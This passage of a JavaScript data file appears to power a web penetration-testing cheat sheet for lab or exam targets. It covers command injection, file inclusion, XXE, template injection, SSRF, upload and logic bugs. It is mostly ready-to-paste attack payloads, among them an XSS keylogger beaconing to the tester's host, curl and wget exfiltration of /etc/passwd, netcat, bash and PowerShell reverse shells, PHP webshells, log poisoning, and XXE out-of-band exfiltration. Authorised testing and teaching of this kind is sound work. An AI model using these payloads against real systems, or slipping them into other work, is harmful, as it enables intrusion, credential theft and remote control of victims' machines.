          tell: "Payload fires later in an admin panel or log viewer. Use a callback that beacons back so you know when and where it ran.",
          cmds: [
            { tool: "beacon", cmd: "<script>new Image().src='http://{tester_ip}:{tester_port}/blind?u='+encodeURIComponent(location)</script>" },
            { tool: "keylogger", cmd: "<script>document.onkeypress=e=>new Image().src='http://{tester_ip}:{tester_port}/k?'+e.key</script>" }
          ] },
        { label: "DOM XSS",
          tell: "Source → sink in client JS: location.hash/search into innerHTML/eval/document.write. No server round-trip.",
          cmds: [
            { tool: "dom-probe", cmd: "{target_url}/#<img src=x onerror=alert(document.domain)>" },
            { tool: "dalfox", cmd: "dalfox url '{target_url}/search?q=FUZZ'   # triage only — confirm the hit by hand" }
          ] }
      ]
    },

    {
      num: "07", id: "cmdi", title: "Command Injection",
      goal: "Separators in anything that shells out — ping, convert, zip, export, dns lookups.",
      items: [
        { label: "Inject & confirm (inline)", sev: "crit",
          tell: "Chain a command with a separator. If output comes back, you're done; if not, go blind.",
          cmds: [
            { tool: "cmdi-probe", cmd: "scripts/cmdi-probe.sh {target_url} 'host=__I__' 127.0.0.1 POST 5 {tester_ip} {tester_port}   # auto separator finder (time-based + OAST)" },
            { tool: "sep", cmd: "; id" },
            { tool: "sep", cmd: "| id" },
            { tool: "sep", cmd: "|| id" },
            { tool: "sep", cmd: "& whoami" },
            { tool: "sub", cmd: "$(id)   ·   `id`" },
            { tool: "newline", cmd: "%0aid" }
          ] },
        { label: "Blind: time + OAST", sev: "crit",
          tell: "No output? Prove exec with a delay or a callback to your catcher.",
          cmds: [
            { tool: "time-nix", cmd: "; sleep 5" },
            { tool: "time-win", cmd: "& ping -n 6 127.0.0.1" },
            { tool: "oast",     cmd: "; curl http://{tester_ip}:{tester_port}/cmdi-$(whoami)" },
            { note: true, tool: "catcher", cmd: "scripts/catch-server.py {tester_port} shows the hit — the path carries your exfil (e.g. the whoami value)." }
          ] },
        { label: "Exfil output (blind)",
          tell: "Pull command output back through your callback when nothing renders on the page.",
          cmds: [
            { tool: "exfil", cmd: "; curl http://{tester_ip}:{tester_port}/ -d \"$(cat /etc/passwd | base64 -w0)\"" },
            { tool: "exfil", cmd: "; wget -q -O- http://{tester_ip}:{tester_port}/?d=$(id|base64 -w0)" }
          ] },
        { label: "Filter bypass",
          tell: "When spaces/slashes/keywords are stripped.",
          cmds: [
            { tool: "nospace", cmd: "cat</etc/passwd   ·   {cat,/etc/passwd}   ·   ${IFS}" },
            { tool: "obfusc",  cmd: "w'h'o'a'mi   ·   who$@ami   ·   /???/??t /etc/passwd" }
          ] },
        { label: "Reverse shell from a web bug", sev: "crit",
          tell: "Once you have exec, go interactive. Start the listener (Reverse Shells tab), fire one of these, then upgrade the TTY and read the proof files.",
          cmds: [
            { tool: "nc-mkfifo", cmd: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {tester_ip} {tester_port} >/tmp/f" },
            { tool: "bash-tcp",  cmd: "; bash -c 'bash -i >& /dev/tcp/{tester_ip}/{tester_port} 0>&1'" },
            { tool: "powershell",cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{tester_ip}',{tester_port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}\"" }
          ] }
      ]
    },

    {
      num: "08", id: "files", title: "File Inclusion & Path Traversal",
      goal: "What you can read, and what you can make the app execute. The straightest road to a proof file.",
      items: [
        { label: "Path traversal / LFI", sev: "crit",
          tell: "../ in any file/path/template/lang param. Try encoded, nested, and absolute. Depth up to ~8.",
          cmds: [
            { tool: "traversal", cmd: "{target_url}/download?file=../../../../../../etc/passwd" },
            { tool: "encoded",   cmd: "{target_url}/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd" },
            { tool: "double",    cmd: "{target_url}/download?file=....//....//....//etc/passwd" },
            { tool: "nested",    cmd: "{target_url}/download?file=..%252f..%252f..%252fetc%252fpasswd" },
            { tool: "absolute",  cmd: "{target_url}/download?file=/etc/passwd" },
            { tool: "ffuf",      cmd: "ffuf -u '{target_url}/download?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 404" }
          ] },
        { label: "PHP wrappers", sev: "crit",
          tell: "php://filter base64-reads source without executing it (grab config / creds). data:// and expect:// can give RCE if allow_url_include is on.",
          cmds: [
            { tool: "filter-read", cmd: "{target_url}/index.php?page=php://filter/convert.base64-encode/resource=config.php" },
            { tool: "filter-proof",cmd: "{target_url}/index.php?page=php://filter/convert.base64-encode/resource=/root/proof.txt" },
            { tool: "data-rce",    cmd: "{target_url}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==&0=id" },
            { tool: "expect-rce",  cmd: "{target_url}/index.php?page=expect://id" },
            { note: true, tool: "chain", cmd: "No wrapper RCE? php_filter_chain generator turns a pure base64 filter read into code exec — see scripts/payloads/lfi.txt." }
          ] },
        { label: "Log poisoning → RCE", sev: "crit",
          tell: "LFI that includes a log/proc you can taint: put PHP in the User-Agent (or a param), then include the log.",
          cmds: [
            { tool: "poison-ua", cmd: "curl -s {target_url}/ -A '<?php system($_GET[0]); ?>'" },
            { tool: "include-log", cmd: "{target_url}/index.php?page=/var/log/apache2/access.log&0=id" },
            { tool: "proc-environ", cmd: "{target_url}/index.php?page=/proc/self/environ&0=id   (poison via User-Agent)" },
            { tool: "auth-log", cmd: "ssh '<?php system($_GET[0]);?>'@{target_ip}   then include /var/log/auth.log" }
          ] },
        { label: "Remote file inclusion (RFI)",
          tell: "If allow_url_include is on, include a payload you host. Append ? to swallow the appended extension.",
          cmds: [
            { tool: "rfi", cmd: "{target_url}/index.php?page=http://{tester_ip}:{tester_port}/shell.txt?" },
            { note: true, tool: "host it", cmd: "echo '<?php system($_GET[0]);?>' > shell.txt; python3 -m http.server {tester_port} --bind {tester_ip}" }
          ] },
        { label: "LFI templates (triage)",
          tell: "Known file-read endpoints — confirm by hand.",
          cmds: [ { tool: "nuclei", cmd: "nuclei -u {target_url} -tags lfi,fileupload   # triage only" } ] }
      ]
    },

    {
      num: "09", id: "xxe", title: "XML External Entities",
      goal: "Any XML sink — SOAP, SAML, DOCX/SVG/XLSX upload, REST that accepts application/xml.",
      items: [
        { label: "Find the XML sink",
          tell: "Switch a JSON request's Content-Type to application/xml and body to XML; or feed XML-backed file formats (.svg, .docx, .xml).",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/api/x -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><r>test</r>'" }
          ] },
        { label: "Classic in-band file read", sev: "crit",
          tell: "Define an external entity pointing at a file and echo it in a reflected field.",
          cmds: [
            { tool: "xxe-read", cmd: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>" },
            { tool: "xxe-php",  cmd: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/root/proof.txt\">]><r>&xxe;</r>" }
          ] },
        { label: "Blind / OOB (out-of-band)", sev: "crit",
          tell: "No reflection? Host an external DTD that reads a file and exfils it to your listener via a parameter entity.",
          cmds: [
            { tool: "payload", cmd: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://{tester_ip}:{tester_port}/evil.dtd\"> %ext;]><r>&send;</r>" },
            { note: true, tool: "helper", cmd: "scripts/xxe-oob.sh {tester_ip} {tester_port} /etc/passwd  — writes evil.dtd, serves it, and catches the exfil in one go." }
          ] },
        { label: "Error-based read",
          tell: "When OOB egress is blocked, leak the file in a parse error message instead.",
          cmds: [
            { note: true, tool: "evil.dtd", cmd: "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>\">%eval;%err;" }
          ] }
      ]
    },

    {
      num: "10", id: "ssti", title: "Server-Side Template Injection",
      goal: "User input rendered as a template → code execution. Fingerprint the engine, then jump to RCE.",
      items: [
        { label: "Detect & fingerprint", sev: "crit",
          tell: "{{7*7}}=49 → Jinja2/Twig. ${7*7} → Freemarker/Velocity/EL. <%=7*7%> → ERB. #{7*7} → Ruby. Follow the decision branch in PayloadsAllTheThings.",
          cmds: [
            { tool: "ssti-probe", cmd: "scripts/ssti-probe.sh {target_url} 'name=__I__' POST   # auto-detect eval + engine, prints the RCE one-liner" },
            { tool: "probe", cmd: "{{7*7}}" },
            { tool: "probe", cmd: "${7*7}" },
            { tool: "probe", cmd: "<%= 7*7 %>" },
            { tool: "probe", cmd: "#{7*7}" },
            { tool: "probe", cmd: "{{7*'7'}}   (Jinja2→7777777 · Twig→49 — disambiguates the two)" }
          ] },
        { label: "RCE by engine", sev: "crit",
          tell: "Paste the matching one-liner. Swap `id` for your reverse-shell command once confirmed.",
          cmds: [
            { tool: "jinja2", cmd: "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}" },
            { tool: "jinja2-alt", cmd: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" },
            { tool: "twig", cmd: "{{['id']|filter('system')}}   ·   {{['id']|map('system')|join}}" },
            { tool: "freemarker", cmd: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}" },
            { tool: "velocity", cmd: "#set($e=$x.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id'))" },
            { tool: "smarty", cmd: "{system('id')}   ·   {php}system('id');{/php}" },
            { tool: "erb", cmd: "<%= `id` %>" }
          ] },
        { label: "Triage",
          tell: "Map candidate params fast, then hand-confirm.",
          cmds: [ { tool: "tplmap", cmd: "tplmap -u '{target_url}/page?name=*'   # triage only" } ] }
      ]
    },

    {
      num: "11", id: "ssrf", title: "SSRF",
      goal: "Make the server make the request. Full tree in the decision box below.",
      items: [
        { label: "Start a listener / redirector", sev: "high",
          tell: "Catch the callback that proves the fetch, and host redirects.",
          cmds: [
            { tool: "nc",     cmd: "nc -lvnp {tester_port}" },
            { tool: "python", cmd: "python3 -m http.server {tester_port} --bind {tester_ip}" }
          ] },
        { label: "Find & confirm the fetch primitive",
          tell: "Any URL feature: webhook, import, avatar/CV, renderer, link preview. Confirm with a listener hit.",
          cmds: [
            { tool: "curl", cmd: "curl -s {target_url}/api/user/preview/cv -H 'Cookie: {cookie}' --data 'cv=http://{tester_ip}:{tester_port}/ssrf-probe'" }
          ] },
        { label: "Fingerprint the fetcher",
          tell: "Read the User-Agent on your listener: curl (gopher/redirects), requests (no gopher), headless (file://,JS).",
          cmds: [ { note: true, tool: "read listener", cmd: "Watch the UA string on your nc/http.server hit — it dictates every later option." } ] },
        { label: "Reach internal / bypass denylist",
          tell: "Loopback & metadata encodings when localhost/127.0.0.1 are blocked by string match.",
          cmds: [
            { note: true, tool: "loopback", cmd: "http://0.0.0.0  http://0  http://[::1]  http://127.0.0.2  http://2130706433  http://0x7f.1" },
            { note: true, tool: "metadata", cmd: "http://169.254.169.254/latest/meta-data/   (cloud IMDS)" }
          ] },
        { label: "Forge a POST via gopher",
          tell: "Create/admin endpoints need a body. libcurl gophers a raw request; mind redirect-protocol limits.",
          cmds: [ { tool: "gopherus", cmd: "gopherus --exploit   # or craft gopher://127.0.0.1:80/_<raw request> by hand" } ] }
      ]
    },

    {
      num: "12", id: "upload", title: "File Upload",
      goal: "Write something executable and reach the path that runs it.",
      items: [
        { label: "Minimal webshells", sev: "crit",
          tell: "Keep them tiny; drop one, then browse to it with ?0=id (or ?cmd=).",
          cmds: [
            { tool: "php", cmd: "<?php system($_GET[0]); ?>" },
            { tool: "php-short", cmd: "<?=`$_GET[0]`?>" },
            { tool: "jsp", cmd: "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>" },
            { tool: "aspx", cmd: "<% Response.Write(new System.Diagnostics.Process... ) %>  (use /usr/share/webshells/aspx)" }
          ] },
        { label: "Type-check bypasses", sev: "high",
          tell: "Beat extension/MIME/magic checks, then find where it lands.",
          cmds: [
            { note: true, tool: "ext",   cmd: "shell.php.jpg · shell.pHp · shell.phtml / .php5 / .phar · trailing dot/space · shell.php%00.jpg (legacy)" },
            { note: true, tool: "mime",  cmd: "Set Content-Type: image/png on the upload part while the body stays PHP." },
            { note: true, tool: "magic", cmd: "Prepend GIF89a; or embed PHP in PNG/EXIF so magic bytes pass: exiftool -Comment='<?php system($_GET[0]);?>' x.png" },
            { note: true, tool: "htaccess", cmd: "Upload .htaccess with 'AddType application/x-httpd-php .jpg' to run .jpg as PHP." }
          ] }
      ]
    },

    {
      num: "13", id: "logic", title: "Other Injection & Business Logic",
      goal: "NoSQL, mass assignment, deserialization, and the bugs that are just broken rules.",
      items: [
        { label: "NoSQL injection", sev: "crit",
          tell: "Operator injection in JSON or bracketed form params.",
          cmds: [
            { tool: "json", cmd: "{\"email\":{\"$ne\":null},\"password\":{\"$ne\":null}}" },
            { tool: "json", cmd: "{\"email\":\"admin@x\",\"password\":{\"$regex\":\"^a\"}}" },
            { tool: "form", cmd: "email[$ne]=null&password[$ne]=null" }
          ] },
        { label: "Mass assignment", sev: "crit",
          tell: "Add role=admin / isAdmin=true / verified=1 to a create/update; test JSON vs form parsing.",
          cmds: [
            { tool: "json", cmd: "curl -s {target_url}/api/user/update -H 'Cookie: {cookie}' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'" },
            { tool: "arjun", cmd: "arjun -u {target_url}/api/user/update -m POST   # find the hidden field first" }
          ] },
        { label: "Deserialization", sev: "high",
          tell: "Serialized blobs in cookies/params: PHP O:… strings, Java rO0AB…/base64 ac ed 00 05, .NET, Python pickle.",
          cmds: [
            { note: true, tool: "spot it", cmd: "PHP: a:/O: prefix · Java: starts 'rO0' (b64) or hex 'ac ed 00 05' · Node: look for node-serialize {\"rce\":_$$ND_FUNC$$_" },
            { tool: "ysoserial", cmd: "java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0   # Java gadget" }
          ] },
        { label: "Workflow / race",
          tell: "Skip steps, replay, reorder; parallel requests against balance/stock/coupons/one-time tokens.",
          cmds: [
            { tool: "race", cmd: "seq 30 | xargs -P30 -I_ curl -s {target_url}/api/redeem -H 'Cookie: {cookie}' -d 'code=ONCE'" },
            { note: true, tool: "Turbo Intruder", cmd: "Single-packet-attack template for tighter timing windows." }
          ] }
      ]
    },

    {
      num: "14", id: "config", title: "Config & Information Disclosure",
      goal: "Free wins and the context that unlocks the rest.",
      items: [
        { label: "Misconfig & known issues",
          tell: "Broad safe scan for exposures, debug, default pages.",
          cmds: [
            { tool: "nuclei", cmd: "nuclei -u {target_url} -severity low,medium,high,critical" },
            { tool: "nikto",  cmd: "nikto -h {target_url}" }
          ] },
        { label: "Exposed source & secrets", sev: "high",
          tell: ".git/, .env, backups, source maps, hardcoded keys in JS.",
          cmds: [
            { tool: "git-dumper", cmd: "git-dumper {target_url}/.git ./{target_host}-git" },
            { tool: "trufflehog", cmd: "trufflehog filesystem ./{target_host}-git --only-verified" }
          ] },
        { label: "TLS & CORS",
          tell: "Weak TLS; permissive or reflected CORS origin with credentials.",
          cmds: [
            { tool: "testssl.sh", cmd: "testssl.sh {target_host}" },
            { tool: "curl",       cmd: "curl -s -I {target_url}/api/ -H 'Origin: https://evil.example' | grep -i access-control" }
          ] }
      ]
    },

    {
      num: "15", id: "stuck", title: "Stuck? Try Harder",
      goal: "No bug biting? You're almost always one transform, one new injection point, or one chain away. Work this list top to bottom.",
      items: [
        { label: "Re-read what you skimmed", sev: "high",
          tell: "The answer is usually already in front of you. Go back to the boring stuff.",
          cmds: [
            { note: true, tool: "checklist", cmd: "Every JS file + HTML comment · Burp HTTP history for odd params/headers · 301/302/403 responses (something is there) · robots.txt, sitemap, /.git, backups · verbose error text · source maps · the response to a BROKEN request (errors leak stacks, paths, DB)." },
            { tool: "grep-js", cmd: "katana -u {target_url} -jc -silent | grep -Eo 'https?://[^\"]+' | sort -u" }
          ] },
        { label: "Transform the payload", sev: "high",
          tell: "The sink may filter one encoding but decode another. Cycle these before abandoning a vector.",
          cmds: [
            { note: true, tool: "encodings", cmd: "URL · double-URL (%252e) · unicode (\\u002e, %u002e) · HTML entity (&#x2f;) · base64 · mixed case · inline comments (/**/, %00) · overlong UTF-8. Burp Decoder/‘Convert selection’ does all of these." },
            { note: true, tool: "content-type", cmd: "Swap the body format the server accepts: form ↔ JSON ↔ XML ↔ multipart. A filter on form params often misses the same data as JSON or XML (and XML opens XXE)." },
            { note: true, tool: "param pollution", cmd: "Send the param twice (id=1&id=2), as an array (id[]=1&id[]=2), or JSON array — parsers disagree on which wins, bypassing validation on the first." }
          ] },
        { label: "Move the injection point", sev: "high",
          tell: "You tested the obvious field. Test the unobvious ones — half of all findings hide here.",
          cmds: [
            { note: true, tool: "everywhere", cmd: "Every GET/POST param · JSON keys AND values · path segments · the FILENAME of an upload · cookies · and headers:" },
            { tool: "headers", cmd: "curl -s {target_url}/ -H 'User-Agent: {payload}' -H 'Referer: {payload}' -H 'X-Forwarded-For: {payload}' -H 'X-Forwarded-Host: {tester_ip}'" },
            { note: true, tool: "second-order", cmd: "Store a payload in one feature (profile name, filename), then trigger it where it's rendered/used elsewhere (admin panel, PDF export, log viewer, the bot's page)." },
            { tool: "find-params", cmd: "arjun -u {target_url}/ -m GET,POST   # discover hidden params the UI never shows" }
          ] },
        { label: "Chain two bugs", sev: "crit",
          tell: "Proof is often behind a chain, not a single bug. Common bridges:",
          cmds: [
            { note: true, tool: "SSRF→internal", cmd: "SSRF reaches an admin API bound to loopback, or cloud metadata (169.254.169.254) for creds." },
            { note: true, tool: "LFI→RCE", cmd: "LFI + log poisoning / php://filter chain / session file / /proc/self/environ → code exec → proof.txt." },
            { note: true, tool: "upload→LFI", cmd: "Upload that won't execute in place + an LFI that includes your uploaded path = RCE." },
            { note: true, tool: "SQLi→shell", cmd: "SQLi INTO OUTFILE a webshell, or xp_cmdshell / COPY TO PROGRAM, then browse it." },
            { note: true, tool: "XSS→admin", cmd: "Stored/blind XSS steals the emulated admin's session → log in → local.txt in the admin UI." },
            { note: true, tool: "XXE→SSRF/read", cmd: "XXE reads local files or pivots to SSRF when direct HTTP is filtered." }
          ] },
        { label: "Beat the filter / 403", sev: "high",
          tell: "A block isn't a dead end — it's a hint you're close.",
          cmds: [
            { tool: "403-bypass", cmd: "curl -s {target_url}/admin -H 'X-Original-URL: /admin'; curl -s {target_url}/admin/.; curl -s {target_url}/ADMIN; curl -s {target_url}/admin%2f; curl -s {target_url}/admin -H 'X-Forwarded-For: 127.0.0.1'" },
            { tool: "verb-tamper", cmd: "curl -s -X POST {target_url}/admin; curl -s -X PUT {target_url}/x; curl -s -X OPTIONS {target_url}/   # a different verb may skip the auth filter" },
            { note: true, tool: "waf", cmd: "Case-swap keywords, add inline comments, use equivalent functions (SLEEP↔BENCHMARK, concat↔||), swap spaces for /**/, %0a, or ${IFS}. See the per-class payload files in scripts/payloads/." }
          ] },
        { label: "Confirm it blind", sev: "high",
          tell: "No output ≠ no bug. If nothing reflects, prove exec/read out-of-band.",
          cmds: [
            { note: true, tool: "catcher", cmd: "Run scripts/catch-server.py {tester_port} and aim ANY of these at it: SQLi/cmdi OAST, blind XSS beacon, SSRF fetch, XXE OOB. A single hit confirms the bug." },
            { tool: "time-probe", cmd: "# generic time oracle — if the response hangs ~5s, you have blind injection:  ;sleep 5  |  ' AND SLEEP(5)-- -  |  {{range(10000000)}}" }
          ] },
        { label: "Reset and pivot",
          tell: "When you've truly exhausted a path.",
          cmds: [
            { note: true, tool: "reset", cmd: "If you polluted the target's state (bad upload, broken row), revert it from the control panel and redo cleanly. Switch to a different vuln class and return later with fresh eyes. Step away for 5 — most breakthroughs come right after a break." }
          ] }
      ]
    },

    {
      num: "16", id: "tips", title: "Tips & Tricks",
      goal: "Workflow, Burp, enumeration and evidence habits that save hours.",
      items: [
        { label: "Burp as your main bench",
          tell: "Manual Burp (Community is fine) does nearly everything here. Live off Repeater.",
          cmds: [
            { note: true, tool: "core", cmd: "Proxy > capture a real request > send to Repeater (Ctrl-R) > mutate. Set Target scope so history stays clean. Comparer diffs true/false blind responses; Decoder handles encodings; Logger keeps the full trail for the report." },
            { note: true, tool: "intruder", cmd: "Intruder Sniper = one position (fuzz one param); Cluster-bomb = creds (user×pass); Pitchfork = paired lists. Grep-Match a success/error string to auto-flag hits." },
            { note: true, tool: "extensions", cmd: "Autorize (access-control/IDOR testing with a low-priv cookie), Turbo Intruder (race conditions / single-packet), Param Miner (hidden params/headers), Hackvertor (nested encoding), JSON Web Tokens." },
            { note: true, tool: "match-replace", cmd: "Proxy > Match and Replace to auto-inject a header/cookie on every request (e.g. force a role header, or add your XSS payload to a field app-wide)." }
          ] },
        { label: "Your own Collaborator",
          tell: "No Burp Pro Collaborator? catch-server.py is your OAST endpoint for every out-of-band bug.",
          cmds: [
            { tool: "catch", cmd: "python3 scripts/catch-server.py {tester_port} --bind {tester_ip}" },
            { note: true, tool: "use", cmd: "Point SSRF, blind cmdi, blind XSS, and XXE OOB at http://{tester_ip}:{tester_port}/<marker> — the path carries your exfil (whoami, cookie, file bytes)." }
          ] },
        { label: "Enumeration that finds more",
          tell: "Most targets are won in discovery. Be exhaustive, then recurse.",
          cmds: [
            { tool: "ext-by-stack", cmd: "ffuf -u {target_url}/FUZZ -w {wordlist} -recursion -recursion-depth 2 -e .php,.phtml,.asp,.aspx,.jsp,.do,.action,.json,.bak,.old,.zip,.txt,.config -fc 404 -c" },
            { tool: "vhosts", cmd: "ffuf -u {target_url}/ -H 'Host: FUZZ.{target_host}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0" },
            { note: true, tool: "wordlists", cmd: "content: raft-*-directories/files · params: burp-parameter-names · LFI: LFI-Jhaddix · users: top-usernames-shortlist · passwords: rockyou / 10k-top. All under /usr/share/seclists." }
          ] },
        { label: "Encoding quick reference",
          tell: "When a char is eaten, reach for the equivalent.",
          cmds: [
            { note: true, tool: "map", cmd: "space → + / %20 / %09 / ${IFS} / /**/   ·   . → %2e / %c0%ae   ·   / → %2f / %5c (win)   ·   ' → %27 / %ef%bc%87 (fullwidth) / backtick   ·   < → %3c / &lt; / \\x3c" },
            { tool: "enc", cmd: "scripts/enc.sh \"' OR 1=1-- -\"   # all variants at once: url/double/base64/hex/CHAR()/entities/unicode/case-flip" },
            { tool: "encode", cmd: "python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"' OR 1=1-- -\"" }
          ] },
        { label: "Work the report as you go", sev: "high",
          tell: "Reconstructing steps at hour 20 loses points and sanity. Capture live.",
          cmds: [
            { note: true, tool: "habit", cmd: "Screenshot the proving request+response the instant a bug works — don't trust you'll reproduce it. Paste each payload into your notes verbatim. Keep one notes block per target (the Findings box per phase, then Export)." },
            { note: true, tool: "proof", cmd: "Grab proof screenshots the moment you have the value, to the exact spec in phase 00 — a missing shot = zero for that target, with no retake." }
          ] },
        { label: "Little things that bite",
          tell: "Cheap mistakes that cost hours.",
          cmds: [
            { note: true, tool: "gotchas", cmd: "Trailing-space/newline in a copied payload · testing HTTP when the app is HTTPS (self-signed → -k / Burp) · forgetting the Cookie on an authed request · a WAF 403 you read as 'not vulnerable' · cached 302s (add a cache-buster) · case-sensitive routes · not URL-encoding & / # / + inside a value." }
          ] }
      ]
    }
  ]
};
